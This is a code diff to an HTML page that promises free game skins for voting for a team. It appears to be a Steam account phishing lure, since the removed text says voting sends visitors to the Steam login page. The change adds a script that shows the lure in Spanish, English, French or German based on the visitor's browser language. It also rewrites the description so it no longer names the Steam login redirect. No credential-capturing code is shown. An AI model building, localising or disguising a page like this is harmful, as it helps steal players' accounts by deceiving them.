@@ -106,16 +106,14 @@
 <body>
 
   <div class="container">
-    <h1>VOTA A UNO DE NUESTRO EQUIPOS POR SKINS GRATIS</h1>
+    <h1 id="title"></h1>
   </div>
 
   <div class="image-cropper">
     <img src="https://pbs.twimg.com/media/GHRV6EpWEAEe7ZR.jpg" alt="Cuchillo">
   </div>
 
-  <div class="steam-text">
-    Mediante votando uno de nuestros equipos, automáticamente será redirigirá a la página de inicio de sesión de Steam.
-  </div>
+  <div class="steam-text" id="description"></div>
 
   <div class="teams-container">
     <div class="team">
@@ -149,5 +147,32 @@
     </div>
   </div>
 
+  <script>
+    const translations = {
+      es: {
+        title: "VOTA A UNO DE NUESTROS EQUIPOS POR SKINS GRATIS",
+        description: "Al votar uno de nuestros equipos, serás redirigido a la página correspondiente."
+      },
+      en: {
+        title: "VOTE FOR ONE OF OUR TEAMS TO GET FREE SKINS",
+        description: "By voting for one of our teams, you will be redirected to the corresponding page."
+      },
+      fr: {
+        title: "VOTEZ POUR L'UNE DE NOS ÉQUIPES POUR DES SKINS GRATUITS",
+        description: "En votant pour l'une de nos équipes, vous serez redirigé vers la page correspondante."
+      },
+      de: {
+        title: "STIMME FÜR EINES UNSERER TEAMS AB, UM KOSTENLOSE SKINS ZU ERHALTEN",
+        description: "Durch die Abstimmung für eines unserer Teams wirst du weitergeleitet."
+      }
+    };
+
+    const userLang = navigator.language.slice(0, 2);
+    const lang = translations[userLang] ? userLang : "en";
+
+    document.getElementById("title").textContent = translations[lang].title;
+    document.getElementById("description").textContent = translations[lang].description;
+  </script>
+
 </body>
-</html>q
+</html>
